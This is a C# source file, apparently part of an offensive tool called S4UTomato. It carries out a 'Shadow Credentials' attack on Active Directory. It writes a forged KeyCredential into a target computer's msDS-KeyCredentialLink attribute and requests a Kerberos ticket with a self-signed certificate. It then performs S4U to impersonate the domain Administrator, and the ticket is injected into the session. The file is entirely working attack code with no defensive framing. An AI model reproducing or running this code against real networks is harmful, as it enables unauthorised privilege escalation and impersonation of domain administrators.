using System;
using System.Reflection;
using S4UTomato.lib.Interop;
using DSInternals.Common.Data;
using System.DirectoryServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

namespace S4UTomato.Methods
{
    internal class ShadowCredentials
    {
        // Code taken from https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c
        private static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            // UseMachineKeyStore: https://stackoverflow.com/questions/1102884/rsacryptoserviceprovider-cryptographicexception-system-cannot-find-the-file-spec
            CspParameters csp = new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString());
            csp.Flags = CspProviderFlags.UseMachineKeyStore;
            RSA rsa = new RSACryptoServiceProvider(2048, csp);
            CertificateRequest req = new CertificateRequest(String.Format("cn={0}", cn), rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

        private static string GenerateRandomPassword()
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[16];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        private static void DecodeDnWithBinary(object dnWithBinary, out byte[] binaryPart, out string dnString)
        {
            System.Type type = dnWithBinary.GetType();

            binaryPart = (byte[])type.InvokeMember(
                "BinaryValue",
                BindingFlags.GetProperty,
                null,
                dnWithBinary,
                null
            );

            dnString = (string)type.InvokeMember(
                "DNString",
                BindingFlags.GetProperty,
                null,
                dnWithBinary,
                null
            );
        }

        private static string Add(string targetComputer, string domain, string domainController, string password)
        {
            DirectoryEntry targetObject = Ldap.LocateAccount(targetComputer, domain, domainController);
            if (targetObject == null)
            {
                return null;
            }

            Console.WriteLine("[*] Generating certificate");
            X509Certificate2 cert = GenerateSelfSignedCert(targetComputer);
            Console.WriteLine("[*] Certificate generaged");
            Console.WriteLine("[*] Generating KeyCredential");
            Guid guid = Guid.NewGuid();
            KeyCredential keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now);
            Console.WriteLine("[*] KeyCredential generated with DeviceID {0}", guid.ToString());

            try
            {
                Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
                targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
                targetObject.CommitChanges();
                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Could not update attribute: {0}", e.Message);
                return null;
            }

            try
            {
                // Console.WriteLine("[*] The associated certificate is:\r\n");
                byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
                string certString = Convert.ToBase64String(certBytes);
                if (S4UTomato.Program.Verbose)
                {

                    Console.WriteLine("[*] base64(certificate):\r\n", certString);

                    if (S4UTomato.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(certString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", certString);
                    }
                    Console.WriteLine();
                }
                return certString;
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Could not save the certificate to file: {0}", e.Message);
                return null;
            }

            //Console.WriteLine("[*] You can now run Rubeus with the following syntax:\r\n");
            //Console.WriteLine("Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /domain:{3} /dc:{4} /getcredentials /show", targetComputer, certOutput, password, domain, domainController);
        }

        private static void Clear(string targetComputer, string domain, string domainController)
        {
            DirectoryEntry targetObject = Ldap.LocateAccount(targetComputer, domain, domainController);
            if (targetObject == null)
            {
                return;
            }

            try
            {
                //Console.WriteLine("[*] Updating the msDS-KeyCredentialLink attribute of the target object");
                targetObject.Properties["msDS-KeyCredentialLink"].Clear();
                targetObject.CommitChanges();
                Console.WriteLine("[+] Updated the msDS-KeyCredentialLink attribute of the target object");
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Could not update attribute: {0}", e.Message);
                return;
            }
        }

        private static bool List(string targetComputer, string domain, string domainController)
        {
            DirectoryEntry targetObject = Ldap.LocateAccount(targetComputer, domain, domainController);
            if (targetObject == null)
            {
                return false;
            }

            Console.WriteLine("[*] Listing deviced for {0}:", targetComputer);
            if (targetObject.Properties["msDS-KeyCredentialLink"].Count == 0)
            {
                Console.WriteLine("[*] No entries!");
                return false;
            }
            else
            {
                for (int i = 0; i < targetObject.Properties["msDS-KeyCredentialLink"].Count; i++)
                {
                    byte[] binaryPart = null;
                    string dnString = null;
                    DecodeDnWithBinary(targetObject.Properties["msDS-KeyCredentialLink"][i], out binaryPart, out dnString);
                    KeyCredential kc = new KeyCredential(binaryPart, dnString);
                    Console.WriteLine("    DeviceID: {0} | Creation Time: {1}", kc.DeviceId, kc.CreationTime);
                }
                return true;
            }
        }

        public static void Execute(string targetComputer, string domain, string domainController, string password, bool force)
        {
            if (S4UTomato.Program.Verbose)
                Console.WriteLine("[*] Action: Shadow Credentials\r\n");

            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            LUID luid = new LUID();

            string targetUser = $"{domain}\\Administrator";
            string targetSPN = "";
            string altService = $"HOST/{Environment.MachineName}";
            string outfile = "";
            bool ptt = true;
            bool self = true;
            string keyString = "";

            if (List(targetComputer, domain, domainController))
            {
                if (force)
                {
                    Clear(targetComputer, domain, domainController);
                }
                else
                {
                    Console.WriteLine("[!] msDS-KeyCredentialLink already has an entry, specify the -f parameter to force update!");
                    Environment.Exit(0);
                }
            }

            if (String.IsNullOrEmpty(password))
            {
                password = GenerateRandomPassword();
                Console.WriteLine("[*] No pass was provided. The certificate will be stored with the password {0}", password);
            }

            string base64Certificate = Add(targetComputer, domain, domainController, password);
            byte[] byteTgt = Ask.TGT(targetComputer, domain, base64Certificate, password, encType, "", ptt: true, domainController, luid, true, getCredentials: true);
            KRB_CRED kirbi = new KRB_CRED(byteTgt);

            encType = Interop.KERB_ETYPE.subkey_keymaterial;
            S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, null, null, null, self, false, false, keyString, encType);
        }
    }
}
